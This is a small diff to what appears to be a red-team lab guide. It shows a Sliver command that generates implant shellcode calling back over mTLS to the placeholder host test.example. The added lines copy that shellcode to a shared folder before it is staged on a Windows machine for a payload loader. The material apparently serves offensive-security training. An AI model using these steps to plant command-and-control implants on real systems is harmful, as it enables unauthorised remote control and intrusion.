@@ -19,7 +19,18 @@ In a sliver shell we need to run the following to generate some shellcode to be 
 generate --mtls test.example -f shellcode --save implants/shellcodex64.bin
 ```
 
+Copy the shell code to the share.
+
+```bash
+mkdir -p /share/operator-$(ip a | grep 172 | awk '{print $2}' | cut -d/ -f1 | cut -d. -f4)
+cp implants/shellcodex64.bin /share/operator-$(ip a | grep 172 | awk '{print $2}' | cut -d/ -f1 | cut -d. -f4)
+```
+
+It is time to switch to windows.
+
 Copy the shellcode to your `Desktop\frostbyte-main` folder on the windows machine.
+
+
 
 ### Setup Files for New Payload
 
